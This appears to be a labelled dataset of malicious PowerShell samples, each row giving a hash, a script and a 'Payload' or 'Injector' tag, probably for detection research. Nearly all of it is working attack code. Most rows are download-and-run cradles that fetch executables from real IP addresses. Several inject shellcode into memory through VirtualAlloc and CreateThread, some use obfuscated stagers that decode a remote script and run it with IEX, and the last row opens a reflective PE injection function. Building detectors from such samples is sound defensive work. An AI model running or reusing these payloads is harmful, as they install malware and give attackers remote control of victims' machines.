(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
eef58f790d1bae1a61be20c145fea11a70c2f028cd4786b86a4952229efefdef,"
(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/owee/owe.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
a3a00ae0ced6416f0d2496909a90d7b420b0bb91733f6f5d331a7779055552c0,"
$Nu5 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Nu5 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc1,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xba,0x7c,0x41,0x82,0x8e,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x80,0xa3,0x77,0x72,0x90,0xa6,0x78,0x8b,0x60,0xc7,0xf1,0x6e,0x51,0xc7,0x66,0xfa,0xc1,0xf7,0xed,0xae,0xed,0x7c,0xa3,0x5a,0x66,0xf0,0x6c,0x6c,0xcf,0xbf,0x4a,0x43,0xd0,0xec,0xaf,0xc2,0x52,0xef,0xe3,0x24,0x6b,0x20,0xf6,0x25,0xac,0x5d,0xfb,0x74,0x65,0x29,0xae,0x68,0x02,0x67,0x73,0x02,0x58,0x69,0xf3,0xf7,0x28,0x88,0xd2,0xa9,0x23,0xd3,0xf4,0x48,0xe0,0x6f,0xbd,0x52,0xe5,0x4a,0x77,0xe8,0xdd,0x21,0x86,0x38,0x2c,0xc9,0x25,0x05,0x81,0x38,0x37,0x41,0x25,0xa3,0x42,0xbb,0x56,0x5e,0x55,0x78,0x25,0x84,0xd0,0x9b,0x8d,0x4f,0x42,0x40,0x2c,0x83,0x15,0x03,0x22,0x68,0x51,0x4b,0x26,0x6f,0xb6,0xe7,0x52,0xe4,0x39,0x28,0xd3,0xbe,0x1d,0xec,0xb8,0x65,0x3f,0xb5,0x64,0xcb,0x40,0xa5,0xc7,0xb4,0xe4,0xad,0xe5,0xa1,0x94,0xef,0x61,0x05,0x95,0x0f,0x71,0x01,0xae,0x7c,0x43,0x8e,0x04,0xeb,0xef,0x47,0x83,0xec,0x10,0x72,0x73,0x62,0xef,0x7d,0x84,0xaa,0x2b,0x29,0xd4,0xc4,0x9a,0x52,0xbf,0x14,0x23,0x87,0x2a,0x10,0xb3,0x7d,0xcd,0x54,0xb4,0x16,0x13,0x69,0x3b,0x5c,0x9a,0x8f,0x6b,0xf2,0xcd,0x1f,0xcb,0xa2,0xad,0xcf,0xa3,0xa8,0x21,0x2f,0xd3,0xd2,0xeb,0x58,0x79,0x3d,0x42,0x30,0x15,0xa4,0xcf,0xca,0x84,0x29,0xda,0xb6,0x86,0xa2,0xe9,0x47,0x48,0x43,0x87,0x5b,0x3c,0xa3,0xd2,0x06,0xea,0xbc,0xc8,0x2d,0x12,0x29,0xf7,0xe7,0x45,0xc5,0xf5,0xde,0xa1,0x4a,0x05,0x35,0xba,0x43,0x93,0xf6,0xd4,0xab,0x73,0xf7,0x24,0xfa,0x19,0xf7,0x4c,0x5a,0x7a,0xa4,0x69,0xa5,0x57,0xd8,0x22,0x30,0x58,0x89,0x97,0x93,0x30,0x37,0xce,0xd4,0x9e,0xc8,0x25,0xe5,0xe3,0x1e,0x03,0x93,0x0d,0xa3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$6qpx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6qpx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6qpx,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
0b3066d1e171e168973179c4397aa99ecca50102f289d742e01092f275cc820e,"
$Wc=NEW-ObJeCT SySTem.Net.WeBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAderS.Add('User-Agent',$u);$Wc.PrOXY = [SYSteM.NeT.WEBREQUESt]::DeFAULTWEBPrOXy;$Wc.PRoXy.CreDeNTiaLs = [SYSTeM.NEt.CreDeNtIalCacHE]::DeFaultNeTWorKCReDENtialS;$K='/j(\wly4+aW

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
c8de1b23be55fdd7cd344f4f4f49efad6509d54ec92b019d084bb74e0ef1c1e0,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x18,0xbd,0x42,0x63,0xda,0xcc,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x4b,0x31,0x42,0x15,0x83,0xc2,0x04,0x03,0x42,0x11,0xe2,0xed,0x41,0xaa,0xe1,0x0d,0xba,0x2b,0x86,0x84,0x5f,0x1a,0x86,0xf2,0x14,0x0d,0x36,0x71,0x78,0xa2,0xbd,0xd7,0x69,0x31,0xb3,0xff,0x9e,0xf2,0x7e,0xd9,0x91,0x03,0xd2,0x19,0xb3,0x87,0x29,0x4d,0x13,0xb9,0xe1,0x80,0x52,0xfe,0x1c,0x68,0x06,0x57,0x6a,0xde,0xb7,0xdc,0x26,0xe2,0x3c,0xae,0xa7,0x62,0xa0,0x67,0xc9,0x43,0x77,0xf3,0x90,0x43,0x79,0xd0,0xa8,0xca,0x61,0x35,0x94,0x85,0x1a,0x8d,0x62,0x14,0xcb,0xdf,0x8b,0xba,0x32,0xd0,0x79,0xc3,0x73,0xd7,0x61,0xb6,0x8d,0x2b,0x1f,0xc0,0x49,0x51,0xfb,0x45,0x4a,0xf1,0x88,0xfd,0xb6,0x03,0x5c,0x9b,0x3d,0x0f,0x29,0xe8,0x1a,0x0c,0xac,0x3d,0x11,0x28,0x25,0xc0,0xf6,0xb8,0x7d,0xe6,0xd2,0xe1,0x26,0x87,0x43,0x4c,0x88,0xb8,0x94,0x2f,0x75,0x1c,0xde,0xc2,0x62,0x2d,0xbd,0x8a,0x47,0x1f,0x3e,0x4b,0xc0,0x28,0x4d,0x79,0x4f,0x82,0xd9,0x31,0x18,0x0c,0x1d,0x35,0x33,0xe8,0xb1,0xc8,0xbc,0x08,0x9b,0x0e,0xe8,0x58,0xb3,0xa7,0x91,0x33,0x43,0x47,0x44,0x93,0x13,0xe7,0x37,0x53,0xc4,0x47,0xe8,0x3b,0x0e,0x48,0xd7,0x5b,0x31,0x82,0x70,0xf1,0xcb,0x45,0xbf,0xad,0xd5,0xf0,0x57,0xaf,0xd5,0xeb,0xfb,0x26,0x33,0x61,0x14,0x6e,0xeb,0x1e,0x8d,0x2b,0x67,0xbe,0x52,0xe6,0x0d,0x80,0xd9,0x02,0xf1,0x4f,0x2a,0x67,0xe1,0xb8,0x15,0x87,0xf9,0x38,0x00,0x87,0x93,0x3c,0x82,0xd0,0x0b,0x3f,0xf3,0x16,0x94,0xc0,0xd6,0x25,0xd3,0x3f,0xa7,0xc0,0xaf,0x76,0x3d,0x52,0xd8,0x76,0xd1,0x52,0x18,0x21,0xbb,0x52,0x70,0x95,0x9f,0x01,0x65,0xda,0x35,0x36,0x36,0x4f,0xb6,0x6e,0xea,0xd8,0xde,0x8c,0xd5,0x2f,0x41,0x6f,0x30,0x2c,0x86,0x8f,0xc5,0xf0,0x76,0x4c,0x10,0x31,0x0d,0xbb,0xa0,0x06,0x1e,0x8e,0x85,0x2f,0xb5,0xf0,0x9a,0x30,0x9c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
3cba5bbc5e21deb42e55b641b26f5058144ad15cfe610a6f7ed654338258c8b9,"
$8kwN = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $8kwN -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc6,0xd9,0x74,0x24,0xf4,0xba,0xd0,0xd3,0x22,0xbe,0x5e,0x2b,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x2c,0x31,0xd7,0x42,0x24,0x34,0x18,0xbb,0xb4,0x59,0x90,0x5e,0x85,0x59,0xc6,0x2b,0xb5,0x69,0x8c,0x7e,0x39,0x01,0xc0,0x6a,0xca,0x67,0xcd,0x9d,0x7b,0xcd,0x2b,0x93,0x7c,0x7e,0x0f,0xb2,0xfe,0x7d,0x5c,0x14,0x3f,0x4e,0x91,0x55,0x78,0xb3,0x58,0x07,0xd1,0xbf,0xcf,0xb8,0x56,0xf5,0xd3,0x33,0x24,0x1b,0x54,0xa7,0xfc,0x1a,0x75,0x76,0x77,0x45,0x55,0x78,0x54,0xfd,0xdc,0x62,0xb9,0x38,0x96,0x19,0x09,0xb6,0x29,0xc8,0x40,0x37,0x85,0x35,0x6d,0xca,0xd7,0x72,0x49,0x35,0xa2,0x8a,0xaa,0xc8,0xb5,0x48,0xd1,0x16,0x33,0x4b,0x71,0xdc,0xe3,0xb7,0x80,0x31,0x75,0x33,0x8e,0xfe,0xf1,0x1b,0x92,0x01,0xd5,0x17,0xae,0x8a,0xd8,0xf7,0x27,0xc8,0xfe,0xd3,0x6c,0x8a,0x9f,0x42,0xc8,0x7d,0x9f,0x95,0xb3,0x22,0x05,0xdd,0x59,0x36,0x34,0xbc,0x35,0xfb,0x75,0x3f,0xc5,0x93,0x0e,0x4c,0xf7,0x3c,0xa5,0xda,0xbb,0xb5,0x63,0x1c,0xbc,0xef,0xd4,0xb2,0x43,0x10,0x25,0x9a,0x87,0x44,0x75,0xb4,0x2e,0xe5,0x1e,0x44,0xcf,0x30,0x8a,0x41,0x47,0x7b,0xe3,0x4b,0xde,0x13,0xf6,0x4b,0xf1,0xbf,0x7f,0xad,0xa1,0x6f,0xd0,0x62,0x01,0xc0,0x90,0xd2,0xe9,0x0a,0x1f,0x0c,0x09,0x35,0xf5,0x25,0xa3,0xda,0xa0,0x1e,0x5b,0x42,0xe9,0xd5,0xfa,0x8b,0x27,0x90,0x3c,0x07,0xc4,0x64,0xf2,0xe0,0xa1,0x76,0x62,0x01,0xfc,0x25,0x24,0x1e,0x2a,0x43,0xc8,0x8a,0xd1,0xc2,0x9f,0x22,0xd8,0x33,0xd7,0xec,0x23,0x16,0x6c,0x24,0xb6,0xd9,0x1a,0x49,0x56,0xda,0xda,0x1f,0x3c,0xda,0xb2,0xc7,0x64,0x89,0xa7,0x07,0xb1,0xbd,0x74,0x92,0x3a,0x94,0x29,0x35,0x53,0x1a,0x14,0x71,0xfc,0xe5,0x73,0x83,0xc0,0x33,0xbd,0xf1,0x28,0x80;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$04ef=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($04ef.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$04ef,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
445a4e81ad763a4fa2ed1f6744b2028358ff8d70945433659a9bcad5dc0cb640,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
652e8cf9b07e8b56d6a48ebabf9e067d242bae14bf7f0d735d4b174f4166a9f3,"
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://198.50.137.173/a.exe', $dpl);Start-Process $dpl

",Injector
3913622a9d879581679609d14a4fb7a927a14092ef16fa67bfe445c0d9b7f3e2,"
$OEu = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $OEu -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4d,0xb3,0xb0,0x00,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$xy2H=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($xy2H.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$xy2H,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
5bea9e5836d5af7e3e1f092c04d02eeafaa0f5d60549aa91c380e9991b9c7507,"
$wc=NeW-OBjEcT System.Net.WebClIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdeRs.AdD('User-Agent',$u);$wC.Proxy = [SYstEM.Net.WeBReQuEst]::DefAUlTWEbProxy;$WC.Proxy.CreDENtIALS = [SYSTem.NET.CReDENTIalCAcHE]::DEFAultNetWORKCRedEnTiALs;$K='63a9f0ea7bb98050796b649e85481845';$i=0;[cHaR[]]$B=([Char[]]($Wc.DOwnloadSTRING(""http://192.168.1.118/index.asp"")))|%{$_-BXoR$k[$i++%$k.LeNgTh]};IEX ($b-jOiN'')

",Payload
85ec6ba7f4cbdf774bee98cd6030b4ca8c13fe45c7fe2f0ce893b170c716a1dc,"function Invoke-ReflectivePEInjection
{


[CmdletBinding(DefaultParameterSetName=""WebFile"")]
Param(
	[Parameter(ParameterSetName = ""LocalFile"", Position = 0, Mandatory = $true)]
	[String]
	$PEPath,
	
	[Parameter(ParameterSetName = ""WebFile"", Position = 0, Mandatory = $true)]
	[Uri]
	$PEUrl,

    [Parameter(ParameterSetName = ""Bytes"", Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Parameter(Position = 6)]
    [Switch]
    $ForceASLR
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	
	
	
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		
		
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		
		
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
